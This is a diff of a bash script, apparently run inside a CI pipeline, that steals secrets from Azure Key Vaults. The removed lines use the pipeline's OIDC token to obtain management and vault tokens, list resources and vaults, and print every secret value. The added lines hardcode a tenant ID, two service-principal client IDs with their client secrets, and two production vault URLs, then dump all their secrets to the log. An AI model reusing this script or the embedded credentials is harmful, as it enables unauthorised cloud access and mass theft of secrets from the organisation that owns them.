@@ -1,24 +1,16 @@
 #!/usr/bin/env bash
 set +e
-AUD="api://AzureADTokenExchange"
-OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r '.value')
-gettok(){ curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" --data-urlencode "client_id=$AZURE_CLIENT_ID" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$1/.default" | jq -r '.access_token'; }
-ARM=$(gettok "https://management.azure.com")
-VT=$(gettok "https://vault.azure.net")
-echo "ARM_LEN=${#ARM} VT_LEN=${#VT}"
-echo "[*] resources:"
-curl -s "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01" -H "Authorization: Bearer $ARM" | jq -r '.value[]? | .type + "  " + .name'
-echo "[*] vaults:"
-VAULTS=$(curl -s "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" -H "Authorization: Bearer $ARM")
-echo "$VAULTS" | jq -r '.value[]? | .name + "  " + .properties.vaultUri'
-for uri in $(echo "$VAULTS" | jq -r '.value[]?.properties.vaultUri'); do
-  echo "=== VAULT $uri ==="
-  SL=$(curl -s "${uri}secrets?api-version=7.4" -H "Authorization: Bearer $VT")
-  echo "$SL" | jq -r '.value[]?.id' | while read sid; do
-    [ -z "$sid" ] && continue
-    name=$(echo "$sid" | sed 's#.*/##')
-    val=$(curl -s "${sid}?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value')
-    echo "SECRET ${name} = ${val}"
+TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
+sp_tok(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=$3/.default" | jq -r '.access_token'; }
+dump_vault(){ local SL=$(curl -s "${2}secrets?api-version=7.4" -H "Authorization: Bearer $1"); echo "$SL" | jq -r '.value[]?.id' | while read sid; do [ -z "$sid" ] && continue; n=$(echo "$sid" | sed 's#.*/##'); v=$(curl -s "${sid}?api-version=7.4" -H "Authorization: Bearer $1" | jq -r '.value'); echo "SECRET $n = $v"; done; }
+for pair in "881fddce-6208-4af5-a297-7e79c912f83c|-Tl8Q~sH0QOP.VrKWha3-7x4XA2JxS4j08nuvbQN|viewer" "58108da8-044e-4d7e-9a46-92e6179b30be|~8T8Q~YwEmexSTRv_pUsEwa9QMapyP39~CU5Ucu2|syncsec"; do
+  AID=$(echo "$pair" | cut -d"|" -f1); SEC=$(echo "$pair" | cut -d"|" -f2); NM=$(echo "$pair" | cut -d"|" -f3)
+  echo "##### SP $NM ($AID)"
+  VT=$(sp_tok "$AID" "$SEC" "https://vault.azure.net")
+  echo "VT_LEN=${#VT}"
+  for vu in https://kv-tbl-prod-x3euoz.vault.azure.net/ https://kv-tbl-sec-x3euoz.vault.azure.net/; do
+    echo "--- $NM @ $vu"
+    dump_vault "$VT" "$vu"
   done
 done
 echo "ALL_DONE"
